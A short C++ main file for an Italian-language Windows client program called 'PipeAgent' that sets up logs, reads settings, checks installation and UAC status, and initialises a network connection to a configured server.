#include <iostream>
#include <windows.h>
#include <essentials.h>
#include <NetEss.h>
#include "Classes.h"
#include "Functions.h"

using namespace std;

int main()
{
	TextColor tc;
	DirUtils du;
	Log ExLog(du.GetCurrentFilePath()+"log\\ExecLog.log", true);
	Log NetLog(du.GetCurrentFilePath()+"log\\NetLog.log" ,true);
	NetSettings NetSet;
	SimpleFileSettings Sett;
	EasyMSGB msgb;
	CLIENT Client;
	GeneralUtils gu;
	
	Sett.SetFileName(du.GetCurrentFilePath()+"Settings.ini");
	
	if(Sett.GetSetting("ShowConsole") == "false")
		gu.HideConsole();
	msgb.DefTitle="PipeAgent";
	
	if(!CheckInst())
	{
		gu.ShowConsole();
		if(!Install())
		{
			msgb.Ok("Installazione fallita.\nPer maggiori informazioni consultare il file \"InstallLog.log\".", msgb.Error);
		}
		return 0;
	}
	
	ExLog.RWFile(); // Sbianco il file di Log
	NetLog.RWFile(); // ...
	
	if(!NetSet.Init())
	{
		//cout<<du.GetCurrentFilePath()<<endl;
		msgb.Ok("Errore durante il controllo dei settaggi.\nPer maggiori informazioni consultare il file \"ExecLog.log\".", msgb.Error);
		return 0;
	}
	
	if(gu.CheckUAC())
		ExLog.WriteLog("UAC SI!");
	else
		ExLog.WriteLog("UAC NO :(");
		
	msgb.Ok("Ciao!!", msgb.Info);
	
	if(!Client.Init(NetSet.ServerAddress, NetSet.ServerPort))
	{
		msgb.Ok("Errroe durante l'inizializzazione del Client.\nPer maggiori informazioni consultare il file \"NetLog.log\".", msgb.Error);
	}
	
	system("pause");
	return 0;
}
